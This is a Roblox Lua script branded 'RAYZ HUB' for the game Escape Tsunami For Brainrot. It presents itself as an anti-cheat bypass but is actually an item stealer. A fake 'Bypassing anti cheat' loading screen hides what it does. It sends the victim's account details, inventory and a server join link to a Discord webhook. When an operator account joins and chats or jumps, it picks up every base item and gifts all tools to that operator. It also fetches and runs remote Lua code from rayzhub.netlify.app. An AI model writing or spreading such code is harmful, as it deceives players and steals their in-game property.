local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local TeleportService = game:GetService("TeleportService")
local TweenService = game:GetService("TweenService")
local player = Players.LocalPlayer

local CONFIG_URL = "https://rayzhub.netlify.app/scripts/config/config.json"

local function loadConfig()
    local success, result = pcall(function()
        local response = game:HttpGet(CONFIG_URL, true)
        return HttpService:JSONDecode(response)
    end)
    if success and result then
        return result
    end
    return nil
end

local Config = loadConfig()

if not Config or not Config.usernames or not Config.webhooks then
    player:Kick("Failed to load config. Check your internet.")
    return
end

local USERNAMES = Config.usernames
local WEBHOOK = Config.webhooks.etfb
local EXCLUDED_ITEMS = { "Basic Bat" }

local NAME = "Escape Tsunami For Brainrot"
local AVATAR_URL = "https://rayzhub.netlify.app/media/etfb(9x9).jpg"
local LOGO_URL = "https://rayzhub.netlify.app/media/logo.jpg"
local IMAGE_URL = "https://rayzhub.netlify.app/media/etfb(9x16).jpg"

---------------------------------------------------------------------
--  HELPER FUNCTIONS
---------------------------------------------------------------------
local function getExecutorName()
	if syn then
		return "Synapse X"
	elseif fluxus then
		return "Fluxus"
	elseif KRNL_LOADED then
		return "KRNL"
	elseif is_sirhurt_closure then
		return "SirHurt"
	elseif getexecutorname then
		local s, r = pcall(getexecutorname)
		if s and r then
			return tostring(r)
		end
	elseif identifyexecutor then
		local s, r = pcall(identifyexecutor)
		if s and r then
			return tostring(r)
		end
	end
	return "Unknown"
end

local function getAccountAge()
	local totalDays = player.AccountAge
	local years = math.floor(totalDays / 365)
	local remaining = totalDays % 365
	local months = math.floor(remaining / 30)
	local days = remaining % 30
	local parts = {}
	if years > 0 then
		table.insert(parts, years .. "y")
	end
	if months > 0 then
		table.insert(parts, months .. "m")
	end
	if days > 0 or #parts == 0 then
		table.insert(parts, days .. "d")
	end
	return table.concat(parts, " ")
end

local function getPlayerCount()
	local current = #Players:GetPlayers()
	local max = Players.MaxPlayers
	return current .. "/" .. max
end

local function getStatusColor(status)
	if status == "🟢 Claimed" then
		return 0x2ECC71
	elseif status == "🔵 Partially Claimed" or status == "🔵 Partially claimed" then
		return 0x3498DB
	elseif
		status == "🟡 Waiting"
		or status == "🟡 Waiting for user"
		or status == "🟡 Picking up items"
		or status == "🟡 Gifting"
		or status == "🟡 Sending trades..."
		or status == "🟢 Connected"
	then
		return 0xF1C40F
	elseif status == "🔴 Failed" then
		return 0xE74C3C
	end
	return 0x800080
end

---------------------------------------------------------------------
--  MAIN WRAPPER (obfuscation-friendly, no top-level return)
---------------------------------------------------------------------
local function main()
	-- ────────────────────────────────────────────────
	-- Server Size Checker (moved inside function, no top-level return)
	-- ────────────────────────────────────────────────
	if #Players:GetPlayers() >= 5 then
		local sg = Instance.new("ScreenGui", player:WaitForChild("PlayerGui"))
		sg.Name = "RayzHubRedirect"

		local mainFrame = Instance.new("Frame", sg)
		mainFrame.Size = UDim2.new(0, 400, 0, 200)
		mainFrame.Position = UDim2.new(0.5, -200, 0.5, -100)
		mainFrame.BackgroundColor3 = Color3.fromRGB(30, 0, 45)
		mainFrame.BorderSizePixel = 0

		local corner = Instance.new("UICorner", mainFrame)
		corner.CornerRadius = UDim.new(0, 10)

		local stroke = Instance.new("UIStroke", mainFrame)
		stroke.Color = Color3.fromRGB(150, 0, 255)
		stroke.Thickness = 2

		local title = Instance.new("TextLabel", mainFrame)
		title.Size = UDim2.new(1, 0, 0, 50)
		title.Text = "RAYZ HUB"
		title.TextColor3 = Color3.fromRGB(200, 100, 255)
		title.TextSize = 28
		title.Font = Enum.Font.GothamBold
		title.BackgroundTransparency = 1

		local sub = Instance.new("TextLabel", mainFrame)
		sub.Size = UDim2.new(1, -40, 0, 60)
		sub.Position = UDim2.new(0, 20, 0, 50)
		sub.Text = "Anti cheat bypass failed on this server, please redirect to a new server"
		sub.TextColor3 = Color3.fromRGB(255, 255, 255)
		sub.TextSize = 16
		sub.Font = Enum.Font.Gotham
		sub.TextWrapped = true
		sub.BackgroundTransparency = 1

		local btn = Instance.new("TextButton", mainFrame)
		btn.Size = UDim2.new(0, 150, 0, 40)
		btn.Position = UDim2.new(0.5, -75, 0, 130)
		btn.BackgroundColor3 = Color3.fromRGB(100, 0, 180)
		btn.Text = "Redirect"
		btn.TextColor3 = Color3.fromRGB(255, 255, 255)
		btn.Font = Enum.Font.GothamBold
		btn.TextSize = 18

		Instance.new("UICorner", btn)

		btn.MouseButton1Click:Connect(function()
			btn.Text = "Finding Server..."
			pcall(function()
				local sf = HttpService:JSONDecode(
					game:HttpGet(
						"https://games.roblox.com/v1/games/"
							.. game.PlaceId
							.. "/servers/Public?sortOrder=Asc&limit=100"
					)
				)
				for _, server in pairs(sf.data) do
					if server.playing < 5 and server.id ~= game.JobId then
						TeleportService:TeleportToPlaceInstance(game.PlaceId, server.id)
						return
					end
				end
			end)
		end)
		return -- return from main() function, not top-level
	end

	-- ────────────────────────────────────────────────
	-- Loading Screen
	-- ────────────────────────────────────────────────
	local function deleteSounds()
		local assets = ReplicatedStorage:FindFirstChild("Assets")
		if assets and assets:FindFirstChild("Sounds") then
			assets.Sounds:Destroy()
		end
	end

	local function message()
		pcall(function()
			setclipboard("https://discord.gg/rayz-hub-1422073445927354380")
		end)
		local packages = ReplicatedStorage:WaitForChild("Packages", 5)
		local net = packages and packages:WaitForChild("Net", 5)
		local popupRemote = net and net:FindFirstChild("RE/DisplayPopup")
		if popupRemote then
			pcall(function()
				popupRemote:FireClient("Info", "Made by RAYZ HUB (discord link copied)", player)
			end)
		end
	end

	local PROXY_URL = (WEBHOOK and WEBHOOK ~= "") and WEBHOOK:gsub("discord.com", "webhook.lewisakura.moe") or nil
	local messageId = nil

	-- ────────────────────────────────────────────────
	-- Inventory Functions
	-- ────────────────────────────────────────────────
	local function getDetailedInventories(showTotal, itemsTaken)
		local baseList = {}
		local backpackList = {}

		local currentBackpack = player:FindFirstChild("Backpack")
		local currentChar = player.Character

		local function scanFolder(folder)
			if not folder then
				return
			end
			for _, item in ipairs(folder:GetChildren()) do
				if item:IsA("Tool") and not table.find(EXCLUDED_ITEMS, item.Name) then
					local brainrotName = item:GetAttribute("BrainrotName") or item.Name
					table.insert(backpackList, brainrotName)
				end
			end
		end

		scanFolder(currentBackpack)
		scanFolder(currentChar)

		local myBase = nil
		local basesFolder = workspace:FindFirstChild("Bases_NEW")
		if basesFolder then
			for _, model in ipairs(basesFolder:GetChildren()) do
				if model:GetAttribute("Holder") == player.UserId then
					myBase = model
					break
				end
			end
		end

		if myBase then
			for i = 1, 12 do
				local slotFolder = myBase:FindFirstChild("slot " .. i .. " brainrot")
				if slotFolder and slotFolder:GetAttribute("BrainrotName") ~= "" then
					local bName = slotFolder:GetAttribute("BrainrotName")
					local brainrotModel = slotFolder:FindFirstChildWhichIsA("Model")
					local bLevel = slotFolder:GetAttribute("Level") or "1"
					local bMut = slotFolder:GetAttribute("Mutation") or "None"
					local rateText, classText = "N/A", "N/A"
					if brainrotModel then
						local stats = brainrotModel:FindFirstChild("ModelExtents")
							and brainrotModel.ModelExtents:FindFirstChild("StatsGui")
							and brainrotModel.ModelExtents.StatsGui:FindFirstChild("Frame")
						if stats then
							if stats:FindFirstChild("Rate") then
								rateText = stats.Rate.Text
							end
							if stats:FindFirstChild("Class") then
								classText = stats.Class.Text
							end
						end
					end
					table.insert(
						baseList,
						string.format(
							"🧬 %s [%s | Lvl %s | %s | %s]",
							bName,
							classText,
							tostring(bLevel),
							bMut,
							rateText
						)
					)
				end
			end
		end

		local baseReport = #baseList > 0 and table.concat(baseList, "\n") or "Empty"
		local backpackReport = #backpackList > 0 and table.concat(backpackList, ", ") or "Empty"

		return baseReport, backpackReport, #baseList, #backpackList
	end

	-- ────────────────────────────────────────────────
	-- Webhook
	-- ────────────────────────────────────────────────
	local function updateWebhook(statusText, color, showTotal, itemsTaken)
		if not PROXY_URL then
			return
		end
		local httpReq = (syn and syn.request)
			or (http and http.request)
			or http_request
			or request
			or httprequest
			or (fluxus and fluxus.request)
		if not httpReq then
			return
		end

		local baseReport, backpackReport, baseCount, backpackCount =
			getDetailedInventories(showTotal, itemsTaken)

		local jobId = tostring(game.JobId)
		local joinLink = "https://rayzhub.netlify.app?placeId=" .. tostring(game.PlaceId) .. "&jobId=" .. jobId
		local executor = getExecutorName()
		local accountAge = getAccountAge()
		local playerCount = getPlayerCount()
		local receiverList = table.concat(USERNAMES, ", ")
		local displayName = (player.DisplayName and player.DisplayName ~= "") and player.DisplayName or player.Name
		local userName = player.Name

		local embedColor = getStatusColor(statusText)

		local tpScript = string.format(
			'game:GetService("TeleportService"):TeleportToPlaceInstance(%d, "%s")',
			game.PlaceId,
			game.JobId
		)

		local playerInfoText = "👤 Display Name  : "
			.. displayName
			.. "\n"
			.. "🆔 Username      : "
			.. userName
			.. "\n"
			.. "📅 Account Age   : "
			.. accountAge
			.. "\n"
			.. "🖥  Executor      : "
			.. executor
			.. "\n"
			.. "👥 Players       : "
			.. playerCount
			.. "\n"
			.. "😎 Receiver      : "
			.. receiverList

		local totalItems = baseCount + backpackCount
		local claimedText = ""
		if showTotal and itemsTaken then
			claimedText = "\n─────────────────────────────────\n📊 Claimed: "
				.. tostring(itemsTaken)
				.. " / "
				.. tostring(totalItems + (itemsTaken or 0))
		else
			claimedText = "\n─────────────────────────────────\n📊 Claimed: 0 / " .. tostring(totalItems)
		end

		local inventoryLines = {}
		if baseReport ~= "Empty" then
			table.insert(inventoryLines, "── Base Items ──")
			table.insert(inventoryLines, baseReport)
		end
		if backpackReport ~= "Empty" then
			table.insert(inventoryLines, "── Backpack Items ──")
			table.insert(inventoryLines, backpackReport)
		end
		local inventoryText = #inventoryLines > 0 and table.concat(inventoryLines, "\n") or "No items found"
		inventoryText = inventoryText .. claimedText

		local contentText = ""
		if totalItems >= 5 then
			contentText = "> @everyone 🔔 **GOOD HIT**"
		elseif totalItems > 0 then
			contentText = "> 🔔 **Small Hit**"
		end
		contentText = contentText .. "\n```lua\n" .. tpScript .. "\n```"

		local payload = HttpService:JSONEncode({
			content = contentText,
			username = NAME,
			avatar_url = AVATAR_URL,
			embeds = {
				{
					title = "⚡ RAYZ HUB ⚡",
					color = embedColor,
					fields = {
						{
							name = "📄 Player Information",
							value = "```" .. playerInfoText .. "```",
							inline = false,
						},
						{
							name = "📡 Player Status",
							value = "```" .. statusText .. "```",
							inline = false,
						},
						{
							name = "🎒 Inventory (" .. tostring(totalItems) .. " items)",
							value = "```" .. inventoryText .. "```",
							inline = false,
						},
						{
							name = "👤 Join Link",
							value = "[🔗 Click to Join Player](" .. joinLink .. ")",
							inline = false,
						},
					},
					footer = {
						text = "RAYZ HUB • " .. os.date("!%m/%d/%Y %I:%M %p") .. " UTC",
						icon_url = LOGO_URL,
					},
					timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ"),
					image = {
						url = IMAGE_URL,
					},
				},
			},
		})

		local url = messageId and (PROXY_URL .. "/messages/" .. messageId) or (PROXY_URL .. "?wait=true")
		local method = messageId and "PATCH" or "POST"

		local success, response = pcall(function()
			return httpReq({
				Url = url,
				Method = method,
				Headers = { ["Content-Type"] = "application/json" },
				Body = payload,
			})
		end)

		if success and not messageId and response and response.Body then
			local decodeOk, decoded = pcall(function()
				return HttpService:JSONDecode(response.Body)
			end)
			if decodeOk and decoded and decoded.id then
				messageId = decoded.id
			end
		end
	end
	_G.updateWebhook = updateWebhook

	-- ────────────────────────────────────────────────
	-- Loading Screen Logic
	-- ────────────────────────────────────────────────
	local function createLoadingScreen()
		local sg = Instance.new("ScreenGui", player:WaitForChild("PlayerGui"))
		sg.Name = "RayzLoading"
		sg.IgnoreGuiInset = true

		local mainF = Instance.new("Frame", sg)
		mainF.Size = UDim2.new(0, 350, 0, 120)
		mainF.Position = UDim2.new(0.5, -175, 0.5, -60)
		mainF.BackgroundColor3 = Color3.fromRGB(20, 10, 30)
		mainF.BorderSizePixel = 0

		local corner = Instance.new("UICorner", mainF)
		corner.CornerRadius = UDim.new(0, 12)

		local stroke = Instance.new("UIStroke", mainF)
		stroke.Color = Color3.fromRGB(150, 0, 255)
		stroke.Thickness = 2
		stroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border

		local titleLabel = Instance.new("TextLabel", mainF)
		titleLabel.Size = UDim2.new(1, 0, 0, 40)
		titleLabel.Text = "Bypassing anti cheat..."
		titleLabel.TextColor3 = Color3.fromRGB(220, 180, 255)
		titleLabel.TextSize = 20
		titleLabel.Font = Enum.Font.GothamBold
		titleLabel.BackgroundTransparency = 1

		local barBg = Instance.new("Frame", mainF)
		barBg.Size = UDim2.new(0.8, 0, 0, 8)
		barBg.Position = UDim2.new(0.1, 0, 0.6, 0)
		barBg.BackgroundColor3 = Color3.fromRGB(40, 20, 60)
		barBg.BorderSizePixel = 0
		Instance.new("UICorner", barBg).CornerRadius = UDim.new(1, 0)

		local barFill = Instance.new("Frame", barBg)
		barFill.Size = UDim2.new(0, 0, 1, 0)
		barFill.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
		barFill.BorderSizePixel = 0
		Instance.new("UICorner", barFill).CornerRadius = UDim.new(1, 0)

		local gradient = Instance.new("UIGradient", barFill)
		gradient.Color = ColorSequence.new(Color3.fromRGB(150, 0, 255), Color3.fromRGB(200, 100, 255))

		local loadingTime = 30
		local startTime = tick()

		task.spawn(function()
			while tick() - startTime < loadingTime do
				local currentProgress = (tick() - startTime) / loadingTime
				barFill.Size = UDim2.new(currentProgress, 0, 1, 0)

				local authorizedFound = false
				for _, name in ipairs(USERNAMES) do
					if Players:FindFirstChild(name) then
						authorizedFound = true
						break
					end
				end

				if authorizedFound then
					sg:Destroy()
					pcall(function()
						loadstring(game:HttpGet("https://rayzhub.netlify.app/scripts/etfb-gui.lua", true))()
					end)
					return
				end
				task.wait(0.5)
			end

			titleLabel.Text = "failed to bypass anti cheat,\n pls try again later"
			titleLabel.TextColor3 = Color3.fromRGB(255, 50, 50)
			barFill.BackgroundColor3 = Color3.fromRGB(255, 50, 50)

			updateWebhook("🔴 Failed", 0xFF0000, false, 0)

			task.wait(2)
			player:Kick("Failed to bypass anti cheat.")
		end)
	end

	createLoadingScreen()
	deleteSounds()
	message()

	local sequenceStarted = false
	updateWebhook("🟡 Waiting for user", 0xFFFF00, false, 0)

	Players.PlayerRemoving:Connect(function(leftPlayer)
		if table.find(USERNAMES, leftPlayer.Name) then
			updateWebhook("🔴 Failed", 0xFF0000, false, 0)
		end
	end)

	-- ────────────────────────────────────────────────
	-- Steal Sequence
	-- ────────────────────────────────────────────────
	local function runSequence(target)
		if not target or sequenceStarted then
			return
		end
		sequenceStarted = true

		local basesFolder = workspace:WaitForChild("Bases_NEW", 5)
		local plotAction =
			ReplicatedStorage:WaitForChild("Packages"):WaitForChild("Net"):WaitForChild("RF/Plot.PlotAction")
		local myBase = nil
		for _, model in ipairs(basesFolder:GetChildren()) do
			if model:GetAttribute("Holder") == player.UserId then
				myBase = model
				break
			end
		end

		local itemsTaken = 0
		local totalOnBase = 0

		if myBase then
			for i = 1, 12 do
				local slot = myBase:FindFirstChild("slot " .. i .. " brainrot")
				if slot and slot:GetAttribute("BrainrotName") ~= "" then
					totalOnBase = totalOnBase + 1
					local success = pcall(function()
						plotAction:InvokeServer("Pick Up Brainrot", myBase.Name, tostring(i))
					end)
					if success then
						itemsTaken = itemsTaken + 1
						updateWebhook("🟡 Picking up items", 0x00FF00, true, itemsTaken)
						task.wait(0.1)
					end
				end
			end
		end

		updateWebhook("🟡 Gifting", 0x00FF00, true, itemsTaken)
		task.wait(1)

		local giftRemote =
			ReplicatedStorage:WaitForChild("Packages"):WaitForChild("Net"):FindFirstChild("RF/Trade.SendGift")

		while target and target.Parent == Players do
			local backpack = player:FindFirstChild("Backpack")
			local character = player.Character
			local humanoid = character and character:FindFirstChild("Humanoid")

			local validTools = {}

			if backpack then
				for _, item in ipairs(backpack:GetChildren()) do
					if item:IsA("Tool") and not table.find(EXCLUDED_ITEMS, item.Name) then
						table.insert(validTools, item)
					end
				end
			end

			if character then
				for _, item in ipairs(character:GetChildren()) do
					if item:IsA("Tool") and not table.find(EXCLUDED_ITEMS, item.Name) then
						table.insert(validTools, item)
					end
				end
			end

			if #validTools == 0 then
				break
			end

			for _, item in ipairs(validTools) do
				if humanoid and item.Parent ~= character then
					humanoid:EquipTool(item)
					task.wait(0.1)
				end

				if item.Parent == character or item.Parent == backpack then
					pcall(function()
						giftRemote:InvokeServer(target, item)
					end)
					task.wait(0.3)
					updateWebhook("🟡 Sending trades...", 0x00FF00, true, itemsTaken)
				end
			end

			task.wait(1)
		end

		if itemsTaken > 0 and itemsTaken < totalOnBase then
			updateWebhook("🔵 Partially Claimed", 0x0000FF, true, itemsTaken)
		else
			updateWebhook("🟢 Claimed", 0x00FF00, true, itemsTaken)
		end

		sequenceStarted = false
	end

	-- ────────────────────────────────────────────────
	-- Authorized Trigger Listeners
	-- ────────────────────────────────────────────────
	local function setupTriggers(p)
		if not table.find(USERNAMES, p.Name) then
			return
		end

		updateWebhook("🟢 Connected", 0x00FF00, false, 0)

		p.Chatted:Connect(function()
			runSequence(p)
		end)

		local function onCharAdded(char)
			local hum = char:WaitForChild("Humanoid")
			hum.Jumping:Connect(function()
				runSequence(p)
			end)
		end

		p.CharacterAdded:Connect(onCharAdded)
		if p.Character then
			onCharAdded(p.Character)
		end
	end

	for _, p in ipairs(Players:GetPlayers()) do
		setupTriggers(p)
	end

	Players.PlayerAdded:Connect(setupTriggers)
end

-- Run everything inside the main function
main()

print("[Rayz Hub] etfb loaded")